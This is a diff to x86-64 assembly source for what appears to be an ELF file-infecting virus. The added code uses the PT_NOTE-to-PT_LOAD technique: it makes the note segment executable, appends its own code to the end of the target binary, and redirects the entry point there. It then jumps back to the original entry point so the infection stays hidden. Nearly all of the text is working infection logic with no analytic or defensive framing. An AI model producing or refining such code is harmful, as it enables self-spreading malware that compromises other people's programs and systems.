@@ -10,6 +10,10 @@ section .text
 
 ; [rsp]     cwd_fd
 _start:
+    push    rdi
+    push    rsi
+    push    rdx
+    push    rbx
     push    rbp
     mov     rbp, rsp
     sub     rsp, 0x10
@@ -34,7 +38,14 @@ _start:
     xor     eax, eax
     add     eax, SYS_CLOSE
     syscall
-    call    _end
+
+    leave
+    pop    rbx
+    pop    rdx
+    pop    rsi
+    pop    rdi
+    jmp     _end
+final_jmp_offset equ $ - _start
 
 ; [rsp]         fd
 ; [rsp + 0x4]   buf_len
@@ -171,17 +182,94 @@ right_type_check:
     mov     [rsp + inf_map], rax
 
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; Mark binary for infection
+    mov     QWORD [rsp + inf_notehdr], 0
 
     mov     r8, rax
     add     r8, [rax + e_phoff]
     movzx   rcx, WORD [rax + e_phnum]
 loop_phdrs:
     cmp     [r8 + p_type], DWORD PT_NOTE
-    jne     next_phdr
+    jne     cmp_load_phdr
     mov     QWORD [rsp + inf_notehdr], r8
+cmp_load_phdr:
+    cmp     [r8 + p_type], DWORD PT_LOAD
+    jne     next_phdr
+    mov     QWORD [rsp + inf_last_pt_load], r8
 next_phdr:
     add     r8w, [rax + e_phentsize]
     loop    loop_phdrs
+
+check_if_note_exists:
+    mov     rax, [rsp + inf_notehdr]
+    test    rax, rax
+    jz      munmap_quit_infect
+
+patch_note_phdr:
+    mov     rax, [rsp + inf_notehdr]
+    mov     [rax + p_type], DWORD PT_LOAD       ; We make it loadable
+    mov     [rax + p_flags], DWORD PF_R | PF_X  ; And executable
+    mov     rdx, QWORD [rsp + inf_filesize]     ; It starts at the EOF
+    mov     QWORD [rax + p_offset], rdx
+    mov     QWORD [rax + p_filesz], virus_len   ; We update the sizes
+    mov     QWORD [rax + p_memsz], virus_len
+    mov     QWORD [rax + p_align], 0x1000       ; And the alignement
+
+    mov     rdx, [rsp + inf_last_pt_load]
+    mov     rcx, [rdx + p_vaddr]                ; we get the last page used
+    and     cx, 0xf000                          ; we align the address on page border
+    add     rcx, [rsp + inf_filesize]           ; and we add the file size to it so that
+                                                ; it will be on another page and also to keep
+                                                ; offset and address consistent
+
+    mov     [rax + p_vaddr], rcx                ; We put it after the last address mapped into memory
+    mov     [rax + p_paddr], rcx                ; but we have to align it on another page
+
+    sub     rax, [rsp + inf_map]                ; We convert our infected segment's address to
+    mov     [rsp + inf_notehdr], rax            ; an offset in case remapping changes the map address
+adjust_file_size:
+    mov     edi, [rsp + inf_fd]
+    mov     rsi, [rsp + inf_filesize]
+    add     rsi, virus_len
+    mov     QWORD [rsp + inf_new_filesize], rsi
+    mov     eax, SYS_FTRUNCATE
+    syscall
+    test    eax, eax
+    jnz     munmap_quit_infect
+
+    mov     rdi, [rsp + inf_map]
+    mov     rsi, [rsp + inf_filesize]
+    mov     rdx, [rsp + inf_new_filesize]
+    xor     r10, r10
+    add     r10b, MREMAP_MAYMOVE
+    mov     eax, SYS_MREMAP
+    syscall
+    test    al, al
+    jnz     munmap_quit_infect
+    mov     [rsp + inf_map], rax            ; This might break the reference to the phdrs
+                                            ; but they are not needed anymore
+    mov     rdi, [rsp + inf_map]
+    add     rdi, [rsp + inf_filesize]
+    lea     rsi, [rel _start]
+    mov     rcx, virus_len
+copy_payload:
+    lodsb
+    stosb
+    loop    copy_payload
+
+patch_entrypoint:
+    mov     r8, [rsp + inf_map]
+    mov     rax, r8
+    add     rax, [rsp + inf_notehdr]
+    mov     rdx, [r8 + e_entry]          ; We save the old entrypoint
+    mov     rcx, [rax + p_vaddr]
+    mov     QWORD [r8 + e_entry], rcx    ; We change the entrypoint to our code
+    add     rcx, final_jmp_offset        ; The address to patch
+    sub     rdx, rcx                     ; We have the relative jump
+    mov     rcx, [rax + p_offset]
+    add     rcx, r8
+    add     rcx, final_jmp_offset - 4    ; The file offset of the address to patch
+    mov     DWORD [rcx], edx             ; We return to the original entrypoint
+
 
 munmap_quit_infect:
     mov     rdi, [rsp + inf_map]
